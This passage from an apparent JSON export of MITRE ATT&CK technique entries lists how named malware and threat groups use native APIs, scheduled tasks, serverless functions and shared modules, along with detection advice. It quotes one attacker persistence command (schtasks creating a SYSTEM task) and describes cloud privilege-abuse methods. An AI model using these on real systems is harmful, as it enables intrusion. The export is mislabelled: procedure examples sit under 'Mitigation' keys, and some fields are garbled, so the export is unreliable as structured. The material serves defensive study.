        "description": "Cuba has used several built-in API functions for discovery like GetIpNetTable and NetShareEnum.[66]"
      },
      {
        "id": "S0687",
        "name": "Cyclops Blink",
        "description": "Cyclops Blink can use various Linux API functions including those for execution and discovery.[67]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla can use a variety of API calls for persistence and defense evasion.[68]"
      },
      {
        "id": "S1033",
        "name": "DCSrv",
        "description": "DCSrv has used various Windows API functions, including DeviceIoControl, as part of its encryption process.[69]"
      },
      {
        "id": "S1052",
        "name": "DEADEYE",
        "description": "DEADEYE can execute the GetComputerNameA and GetComputerNameExA WinAPI functions.[70]"
      },
      {
        "id": "S0354",
        "name": "Denis",
        "description": "Denis used the IsDebuggerPresent, OutputDebugString, and SetLastError APIs to avoid debugging. Denis used GetProcAddress and LoadLibrary to dynamically resolve APIs. Denis also used the Wow64SetThreadContext API as part of a process hollowing process.[71]"
      },
      {
        "id": "S0659",
        "name": "Diavol",
        "description": "Diavol has used several API calls like GetLogicalDriveStrings, SleepEx, SystemParametersInfoAPI, CryptEncrypt, and others to execute parts of its attack.[72]"
      },
      {
        "id": "S0695",
        "name": "Donut",
        "description": "Donut code modules use various API functions to load and inject code.[73]"
      },
      {
        "id": "S0694",
        "name": "DRATzarus",
        "description": "DRATzarus can use various API calls to see if it is running in a sandbox.[74]"
      },
      {
        "id": "S0384",
        "name": "Dridex",
        "description": "Dridex has used the OutputDebugStringW function to avoid malware analysis as part of its anti-debugging technique.[75]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor has used the Windows API to make detection more difficult.[76]"
      },
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has used CreateProcess to create a new process to run its executable and WNetEnumResourceW to enumerate non-hidden shares.[77]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire contains a variety of enumeration modules that have an option to use API calls to carry out tasks.[78]"
      },
      {
        "id": "S0396",
        "name": "EvilBunny",
        "description": "EvilBunny has used various API calls as part of its checks to see if the malware is running in a sandbox.[79]"
      },
      {
        "id": "S0569",
        "name": "Explosive",
        "description": "Explosive has a function to call the OpenClipboard wrapper.[80]"
      },
      {
        "id": "S0512",
        "name": "FatDuke",
        "description": "FatDuke can call ShellExecuteW to open the default browser on the URL localhost.[81]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro can use Native API to enable obfuscation including GetLastError and GetTickCount.[82]"
      },
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb's loader can use API functions to load the FoggyWeb backdoor into the same Application Domain within which the legitimate AD FS managed code is executed.[83]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can use Native API for defense evasion, discovery, and collection.[84]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group malware has used CreateProcess to launch additional malicious components.[85]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium has the ability to use various Windows API functions to perform tasks.[56]"
      },
      {
        "id": "S0032",
        "name": "gh0st RAT",
        "description": "gh0st RAT has used the InterlockedExchange, SeShutdownPrivilege, and ExitWindowsEx Windows API functions.[86]"
      },
      {
        "id": "S0493",
        "name": "GoldenSpy",
        "description": "GoldenSpy can execute remote commands in the Windows command shell using the WinExec() API.[87]"
      },
      {
        "id": "S0477",
        "name": "Goopy",
        "description": "Goopy has the ability to  enumerate the infected system's user name via GetUserNameW.[71]"
      },
      {
        "id": "G0078",
        "name": "Gorgon Group",
        "description": "Gorgon Group malware can leverage the Windows API call, CreateProcessA(), for execution.[88]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can execute through the WinExec API.[89]"
      },
      {
        "id": "S0632",
        "name": "GrimAgent",
        "description": "GrimAgent can use Native API including GetProcAddress and ShellExecuteW.[90]"
      },
      {
        "id": "S0561",
        "name": "GuLoader",
        "description": "GuLoader can use a number of different APIs for discovery and execution.[91]"
      },
      {
        "id": "S0499",
        "name": "Hancitor",
        "description": "Hancitor has used CallWindowProc and EnumResourceTypesA to interpret and execute shellcode.[92]"
      },
      {
        "id": "S0391",
        "name": "HAWKBALL",
        "description": "HAWKBALL has leveraged several Windows API calls to create processes, gather disk information, and detect debugger activity.[93]"
      },
      {
        "id": "S0697",
        "name": "HermeticWiper",
        "description": "HermeticWiper can call multiple Windows API functions used for privilege escalation, service execution, and to overwrite random bites of data.[94][95][96][97]"
      },
      {
        "id": "S0698",
        "name": "HermeticWizard",
        "description": "HermeticWizard can connect to remote shares using WNetAddConnection2W.[96]"
      },
      {
        "id": "G0126",
        "name": "Higaisa",
        "description": "Higaisa has called various native OS APIs.[98]"
      },
      {
        "id": "S0431",
        "name": "HotCroissant",
        "description": "HotCroissant can perform dynamic DLL importing and API lookups using LoadLibrary and GetProcAddress on obfuscated strings.[99]"
      },
      {
        "id": "S0398",
        "name": "HyperBro",
        "description": "HyperBro has the ability to run an application (CreateProcessW) or script/file (ShellExecuteW) via API.[100]"
      },
      {
        "id": "S0537",
        "name": "HyperStack",
        "description": "HyperStack can use Windows API's ConnectNamedPipe and WNetAddConnection2 to detect incoming connections and connect to remote shares.[101]"
      },
      {
        "id": "S0483",
        "name": "IcedID",
        "description": "IcedID has called ZwWriteVirtualMemory, ZwProtectVirtualMemory, ZwQueueApcThread, and NtResumeThread to inject itself into a remote process.[102]"
      },
      {
        "id": "S0434",
        "name": "Imminent Monitor",
        "description": "Imminent Monitor has leveraged CreateProcessW() call to execute the debugger.[103]"
      },
      {
        "id": "S0259",
        "name": "InnaputRAT",
        "description": "InnaputRAT uses the API call ShellExecuteW for execution.[104]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can use winapiexec tool for indirect execution of  ShellExecuteW and CreateProcessA.[105]"
      },
      {
        "id": "S1020",
        "name": "Kevin",
        "description": "Kevin can use the ShowWindow API to avoid detection.[106]"
      },
      {
        "id": "S0607",
        "name": "KillDisk",
        "description": "KillDisk has called the Windows API to retrieve the hard disk handle and shut down the machine.[107]"
      },
      {
        "id": "S0669",
        "name": "KOCTOPUS",
        "description": "KOCTOPUS can use the LoadResource and CreateProcessW APIs for execution.[108]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI has hardcoded API calls within its functions to use on the victim's machine.[109]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has used the Windows API ObtainUserAgentString to obtain the User-Agent from a compromised host to connect to a C2 server.[110] Lazarus Group has also used various, often lesser known, functions to perform various types of Discovery and Process Injection.[111][112]"
      },
      {
        "id": "S0395",
        "name": "LightNeuron",
        "description": "LightNeuron is capable of starting a process using CreateProcess.[113]"
      },
      {
        "id": "S0680",
        "name": "LitePower",
        "description": "LitePower can use various API calls.[114]"
      },
      {
        "id": "S0681",
        "name": "Lizar",
        "description": "Lizar has used various Windows API functions on a victim's machine.[115]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot has used LoadLibrary(), GetProcAddress() and CreateRemoteThread() API functions to execute its shellcode.[116]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa has used macOS API functions to perform tasks.[117][118]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can use a variety of API calls.[119]"
      },
      {
        "id": "S0652",
        "name": "MarkiRAT",
        "description": "MarkiRAT can run the ShellExecuteW API via the Windows Command Shell.[120]"
      },
      {
        "id": "S0449",
        "name": "Maze",
        "description": "Maze has used several Windows API functions throughout the encryption process including IsDebuggerPresent, TerminateProcess, Process32FirstW, among others.[121]"
      },
      {
        "id": "S0576",
        "name": "MegaCortex",
        "description": "After escalating privileges, MegaCortex calls TerminateProcess(), CreateRemoteThread, and other Win32 APIs.[122]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has used native APIs including GetModuleFileName, lstrcat, CreateFile, and ReadFile.[123]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can execute an operator-provided Windows command by leveraging functions such as WinExec, WriteFile, and ReadFile.[119][124]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has used native WINAPI calls.[125][126]"
      },
      {
        "id": "S0688",
        "name": "Meteor",
        "description": "Meteor can use WinAPI to remove a victim machine from an Active Directory domain.[127]"
      },
      {
        "id": "S1015",
        "name": "Milan",
        "description": "Milan can use the API DnsQuery_A for DNS resolution.[106]"
      },
      {
        "id": "S0084",
        "name": "Mis-Type",
        "description": "Mis-Type has used Windows API calls, including NetUserAdd and NetUserDel.[128]"
      },
      {
        "id": "S0083",
        "name": "Misdat",
        "description": "Misdat has used Windows APIs, including ExitWindowsEx and GetKeyboardType.[128]"
      },
      {
        "id": "S0256",
        "name": "Mosquito",
        "description": "Mosquito leverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions.[129]"
      },
      {
        "id": "S0630",
        "name": "Nebulae",
        "description": "Nebulae has the ability to use CreateProcess to execute a process.[130]"
      },
      {
        "id": "S0457",
        "name": "Netwalker",
        "description": "Netwalker can use Windows API functions to inject the ransomware DLL.[131]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can use Native API including CreateProcess GetProcessById, and WriteProcessMemory.[132]"
      },
      {
        "id": "S1090",
        "name": "NightClub",
        "description": "NightClub can use multiple native APIs including GetKeyState, GetForegroundWindow, GetWindowThreadProcessId, and GetKeyboardLayout.[133]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT has used the ShellExecute() function within a script.[134]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "During Operation Dream Job, Lazarus Group used Windows API ObtainUserAgentString to obtain the victim's User-Agent and used the value to connect to their C2 server.[110]"
      },
      {
        "id": "C0006",
        "name": "Operation Honeybee",
        "description": "During Operation Honeybee, the threat actors deployed malware that used API calls, including CreateProcessAsUser.[135]"
      },
      {
        "id": "C0013",
        "name": "Operation Sharpshooter",
        "description": "During Operation Sharpshooter, the first stage downloader resolved various Windows libraries and APIs, including LoadLibraryA(), GetProcAddress(), and CreateProcessA().[136]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used the CreateProcessA and ShellExecute API functions to launch commands after being injected into a selected process.[137]"
      },
      {
        "id": "S1050",
        "name": "PcShare",
        "description": "PcShare has used a variety of Windows API functions.[84]"
      },
      {
        "id": "S0517",
        "name": "Pillowmint",
        "description": "Pillowmint has used multiple native Windows APIs to execute and conduct process injections.[138]"
      },
      {
        "id": "S0501",
        "name": "PipeMon",
        "description": "PipeMon's first stage has been executed by a call to CreateProcess with the decryption password in an argument. PipeMon has used a call to LoadLibrary to load its installer.[139]"
      },
      {
        "id": "S0435",
        "name": "PLEAD",
        "description": "PLEAD can use ShellExecute to execute applications.[140]"
      },
      {
        "id": "S0013",
        "name": "PlugX",
        "description": "PlugX can use the Windows API functions GetProcAddress, LoadLibrary, and CreateProcess to execute another process.[141][142]"
      },
      {
        "id": "S0518",
        "name": "PolyglotDuke",
        "description": "PolyglotDuke can use LoadLibraryW and CreateProcess to load and execute code.[81]"
      },
      {
        "id": "S0453",
        "name": "Pony",
        "description": "Pony has used several Windows functions for various purposes.[143]"
      },
      {
        "id": "S1058",
        "name": "Prestige",
        "description": "Prestige has used the Wow64DisableWow64FsRedirection() and Wow64RevertWow64FsRedirection() functions to disable and restore file system redirection.[144]"
      },
      {
        "id": "S0147",
        "name": "Pteranodon",
        "description": "Pteranodon has used various API calls.[145]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can use GetProcAddress to help delete malicious strings from memory.[146]"
      },
      {
        "id": "S1076",
        "name": "QUIETCANARY",
        "description": "QUIETCANARY can call System.Net.HttpWebRequest to identify the default proxy configured on the victim computer.[147]"
      },
      {
        "id": "S0629",
        "name": "RainyDay",
        "description": "The file collection tool used by RainyDay can utilize native API including ReadDirectoryChangeW for folder monitoring.[130]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can use Windows API functions such as WriteFile, CloseHandle, and GetCurrentHwProfile during its collection and file storage operations. Ramsay can execute its embedded components via CreateProcessA and ShellExecute.[148]"
      },
      {
        "id": "S0662",
        "name": "RCSession",
        "description": "RCSession can use WinSock API for communication including WSASend and WSARecv.[149]"
      },
      {
        "id": "S0416",
        "name": "RDFSNIFFER",
        "description": "RDFSNIFFER has used several Win32 API functions to interact with the victim machine.[150]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil can use Native API for execution and to retrieve active services.[151][152]"
      },
      {
        "id": "S0448",
        "name": "Rising Sun",
        "description": "Rising Sun used dynamic API resolutions to various Windows APIs by leveraging LoadLibrary() and GetProcAddress().[136]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can use a variety of API calls to execute shellcode.[153]"
      },
      {
        "id": "S1078",
        "name": "RotaJakiro",
        "description": "When executing with non-root permissions, RotaJakiro uses the the shmget API to create shared memory between other known RotaJakiro processes. RotaJakiro also uses the execvp API to help its dead process \"resurrect\".[154]"
      },
      {
        "id": "S1073",
        "name": "Royal",
        "description": "Royal can use multiple APIs for discovery, communication, and execution.[155]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM can use the FindNextUrlCacheEntryA and FindFirstUrlCacheEntryA functions to search for specific strings within browser history.[156]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has used multiple native APIs including ShellExecuteW to run executables,GetWindowsDirectoryW to create folders, and VirtualAlloc, WriteProcessMemory, and CreateRemoteThread for process injection.[157]"
      },
      {
        "id": "S0085",
        "name": "S-Type",
        "description": "S-Type has used Windows APIs, including GetKeyboardType, NetUserAdd, and NetUserDel.[128]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot has used different API calls, including GetProcAddress, VirtualAllocEx, WriteProcessMemory, CreateProcessA, and SetThreadContext.[158][159]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic has the ability to call Win32 API functions to determine if powershell.exe is running.[160]"
      },
      {
        "id": "S1089",
        "name": "SharpDisco",
        "description": "SharpDisco can leverage Native APIs through plugins including GetLogicalDrives.[133]"
      },
      {
        "id": "S0444",
        "name": "ShimRat",
        "description": "ShimRat has used Windows API functions to install the service and shim.[161]"
      },
      {
        "id": "S0445",
        "name": "ShimRatReporter",
        "description": "ShimRatReporter used several Windows API functions to gather information from the infected system.[161]"
      },
      {
        "id": "G1008",
        "name": "SideCopy",
        "description": "SideCopy has executed malware by calling the API function CreateProcessW.[162]"
      },
      {
        "id": "S0610",
        "name": "SideTwist",
        "description": "SideTwist can use GetUserNameW, GetComputerNameW, and GetComputerNameExW to gather information.[163]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence has leveraged the Windows API, including using CreateProcess() or ShellExecute(), to perform a variety of tasks.[164][165]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY has the ability to leverage API including GetProcAddress and LoadLibrary.[166]"
      },
      {
        "id": "S0623",
        "name": "Siloscape",
        "description": "Siloscape makes various native API calls.[167]"
      },
      {
        "id": "S0627",
        "name": "SodaMaster",
        "description": "SodaMaster can use RegOpenKeyW to access the Registry.[168]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT has the ability to respawn itself using ShellExecuteW and CreateProcessW.[65]"
      },
      {
        "id": "S1034",
        "name": "StrifeWater",
        "description": "StrifeWater can use a variety of APIs for execution.[169]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet uses the SetSecurityDescriptorDacl API to reduce object integrity levels.[170]"
      },
      {
        "id": "S0562",
        "name": "SUNSPOT",
        "description": "SUNSPOT used Windows API functions such as MoveFileEx and NtQueryInformationProcess as part of the SUNBURST injection process.[171]"
      },
      {
        "id": "S1064",
        "name": "SVCReady",
        "description": "SVCReady can use Windows API calls to gather information from an infected host.[172]"
      },
      {
        "id": "S0242",
        "name": "SynAck",
        "description": "SynAck parses the export tables of system DLLs to locate and call various Windows API functions.[173][174]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate can call the GetNetworkParams API as part of its C2 establishment process.[175]"
      },
      {
        "id": "G0092",
        "name": "TA505",
        "description": "TA505 has deployed payloads that use Windows API calls on a compromised host.[176]"
      },
      {
        "id": "S0011",
        "name": "Taidoor",
        "description": "Taidoor has the ability to use native APIs for execution including GetProcessHeap, GetProcAddress, and LoadLibrary.[177][178]"
      },
      {
        "id": "S0595",
        "name": "ThiefQuest",
        "description": "ThiefQuest uses various API to perform behaviors such as executing payloads and performing local enumeration.[179]"
      },
      {
        "id": "S0668",
        "name": "TinyTurla",
        "description": "TinyTurla has used WinHTTP, CreateProcess, and other APIs for C2 communications and other functions.[180]"
      },
      {
        "id": "S0678",
        "name": "Torisma",
        "description": "Torisma has used various Windows API calls.[181]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot uses the Windows API call, CreateProcessW(), to manage execution flow.[182] TrickBot has also used Nt* API functions to perform Process Injection.[183]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper has used multiple Windows APIs including HttpInitialize, HttpCreateHttpHandle, and HttpAddUrl.[184]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.[185]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos can use native Windows APIs including GetHostByName.[186]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has used CreateProcessW to create child processes.[187]"
      },
      {
        "id": "S0180",
        "name": "Volgmer",
        "description": "Volgmer executes payloads using the Windows API call CreateProcessW().[188]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT can use a variety of API calls on a compromised host.[189]"
      },
      {
        "id": "S0612",
        "name": "WastedLocker",
        "description": "WastedLocker's custom crypter, CryptOne, leveraged the VirtualAlloc() API function to help execute the payload.[190]"
      },
      {
        "id": "S0579",
        "name": "Waterbear",
        "description": "Waterbear can leverage API functions for execution.[191]"
      },
      {
        "id": "S0689",
        "name": "WhisperGate",
        "description": "WhisperGate has used the ExitWindowsEx to flush file buffers to disk and stop running processes and other API calls.[192][193]"
      },
      {
        "id": "S0466",
        "name": "WindTail",
        "description": "WindTail can invoke Apple APIs contentsOfDirectoryAtPath, pathExtension, and (string) compare.[194]"
      },
      {
        "id": "S0141",
        "name": "Winnti for Windows",
        "description": "Winnti for Windows can use Native API to create a new process and to start services.[195]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can use multiple native APIs, including WriteProcessMemory, CreateProcess, and CreateRemoteThread for process injection.[196]"
      },
      {
        "id": "S0161",
        "name": "XAgentOSX",
        "description": "XAgentOSX contains the execFile function to execute a specified file on the system using the NSTask:launch method.[197]"
      },
      {
        "id": "S0653",
        "name": "xCaon",
        "description": "xCaon has leveraged native OS function calls to retrieve  victim's network adapter's  information using GetAdapterInfo() API.[47]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell can leverage native API including RegisterServiceCtrlHandler  to register a service.RegisterServiceCtrlHandler"
      },
      {
        "id": "S1013",
        "name": "ZxxZ",
        "description": "ZxxZ has used API functions such as Process32First, Process32Next, and ShellExecuteA.[198]"
      }
    ],
    "Detection": [
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Utilization of the Windows APIs may involve processes loading/accessing system DLLs associated with providing called functions (ex: ntdll.dll, kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and may be difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient."
      }
    ],
    "Subtechniques": "\nExecution"
  },
  {
    "Title": "Scheduled Task/Job",
    "Code": "T1053",
    "Description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.[1]Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.[2]",
    "Mitigation": [
      {
        "id": "S1052",
        "name": "DEADEYE",
        "description": "DEADEYE has used the scheduled tasks \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared to establish persistence.[3]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca used the command schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR \"[file path]\" /ru system for persistence.[4]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot's second stage DLL has set a timer using \"timeSetEvent\" to schedule its next execution.[5]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec schedules the execution one of its modules by creating a new scheduler task.[6]"
      },
      {
        "id": "S1034",
        "name": "StrifeWater",
        "description": "StrifeWater has create a scheduled task named Mozilla\\Firefox Default Browser Agent 409046Z0FF4A39CB for persistence.[7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "DS0032",
        "dsource": "Container",
        "dcomp": "Container Creation",
        "detects": "Monitor for newly constructed containers that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor newly constructed files that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "DS0003",
        "dsource": "Scheduled Job",
        "dcomp": "Scheduled Job Creation",
        "detects": "Monitor newly constructed scheduled jobs that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1053.002",
        "name": "At"
      },
      {
        "id": "T1053.003",
        "name": "Cron"
      },
      {
        "id": "T1053.005",
        "name": "Scheduled Task"
      },
      {
        "id": "T1053.006",
        "name": "Systemd Timers"
      },
      {
        "id": "T1053.007",
        "name": "Container Orchestration Job"
      }
    ],
    "Tactic": "Execution, Persistence, PrivilegeEscalation"
  },
  {
    "Title": "Serverless Execution",
    "Code": "T1648",
    "Description": "Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. Adversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. Resource Hijacking).[1] Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the IAM:PassRole permission in AWS or the iam.serviceAccounts.actAs permission in Google Cloud to add Additional Cloud Roles to a serverless cloud function, which may then be able to perform actions the original user cannot.[2][3]Serverless functions can also be invoked in response to cloud events (i.e. Event Triggered Execution), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds Additional Cloud Credentials to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created.[4] Similarly, an adversary may create a Power Automate workflow in Office 365 environments that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.[5][6]",
    "Mitigation": [
      {
        "id": "S1091",
        "name": "Pacu",
        "description": "Pacu can create malicious Lambda functions.[7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor logs generated by serverless execution for unusual activity. For example, in Exchange environments emails sent by Power Automate via the Outlook 365 connector include the phrase ‘Power App’ or ‘Power Automate’ in the SMTP header 'x-ms-mail-application.'[8]"
      },
      {
        "id": "DS0025",
        "dsource": "Cloud Service",
        "dcomp": "Cloud Service Modification",
        "detects": "Monitor the creation and modification of serverless resources such as functions and workflows."
      }
    ],
    "Subtechniques": "\nExecution"
  },
  {
    "Title": "Shared Modules",
    "Code": "T1129",
    "Description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.The Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.[1][2][3][4]The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.[5]",
    "Mitigation": [
      {
        "id": "S0373",
        "name": "Astaroth",
        "description": "Astaroth uses the LoadLibraryExW() function to load additional modules. [6]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor's dispatcher can execute additional plugins by loading the respective DLLs.[7]"
      },
      {
        "id": "S0520",
        "name": "BLINDINGCAN",
        "description": "BLINDINGCAN has loaded and executed DLLs in memory during runtime on a victim machine.[8]"
      },
      {
        "id": "S0415",
        "name": "BOOSTWRITE",
        "description": "BOOSTWRITE has used the DWriteCreateFactory() function to load additional modules.[9]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can use LoadLibrary to attempt to execute GdiPlus.dll.[10]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman can load DLLs.[11]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack contains a function that calls LoadLibrary and GetProcAddress.[12]"
      },
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb's loader can call the load() function to load the FoggyWeb dll into an Application Domain on a compromised AD FS server.[13]"
      },
      {
        "id": "S0032",
        "name": "gh0st RAT",
        "description": "gh0st RAT can load DLLs into memory.[14]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq creates a backdoor through which remote attackers can load and call DLL functions.[15][16]"
      },
      {
        "id": "S0607",
        "name": "KillDisk",
        "description": "KillDisk loads and executes functions from a DLL.[17]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo had used AutoIt to load and execute the DLL payload.[18]"
      },
      {
        "id": "S0352",
        "name": "OSX_OCEANLOTUS.D",
        "description": "For network communications, OSX_OCEANLOTUS.D loads a dynamic library (.dylib file) using dlopen() and obtains a function pointer to execute within that shared library using dlsym().[4]"
      },
      {
        "id": "S0501",
        "name": "PipeMon",
        "description": "PipeMon has used call to LoadLibrary to load its installer. PipeMon loads its modules using reflective loading or custom shellcode.[19]"
      },
      {
        "id": "S0196",
        "name": "PUNCHBUGGY",
        "description": "PUNCHBUGGY can load a DLL using the LoadLibrary API.[20]"
      },
      {
        "id": "S1078",
        "name": "RotaJakiro",
        "description": "RotaJakiro uses dynamically linked shared libraries (.so files) to execute additional functionality using dlopen() and dlsym().[3]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet calls LoadLibrary then executes exports from a DLL.[21]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to inject the LoadLibrary call template DLL into running processes.[22]"
      }
    ],
    "Detection": [
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitoring module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of shared modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled, or system modules such that deviation from known module loads may be suspiciousLimiting module loads to trusted directories, such as %SystemRoot% and %ProgramFiles% on Windows, may protect against module loads from unsafe paths."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may execute malicious payloads via loading shared modules."
      }
    ],
    "Subtechniques": "\nExecution"
  },
  {
    "Title": "Software Deployment Tools",
    "Code": "T1072",
